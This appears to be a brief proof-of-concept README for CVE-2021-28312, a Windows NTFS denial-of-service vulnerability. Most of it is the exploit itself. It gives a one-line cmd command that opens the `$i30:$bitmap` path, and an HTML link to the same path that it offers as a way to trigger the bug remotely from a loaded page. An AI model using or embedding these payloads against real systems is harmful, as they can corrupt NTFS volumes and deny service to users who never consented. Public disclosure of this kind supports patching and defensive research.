# CVE-2021-28312
POC and description for CVE-2021-28312
### Windows NTFS Denial of Service Vulnerability
Link: https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-28312
### Reproduction 
From cmd: type following command `cd c:\:$i30:$bitmap` <br/>
Remote exploitation possibility: Can be done by adding following link on locally loaded page
```
<a href="file:\\c:\:$i30:$bitmap">Click here</a>
```
---
Details about $i30 attribute: https://www.sans.org/blog/ntfs-i30-index-attributes-evidence-of-deleted-and-overwritten-files/
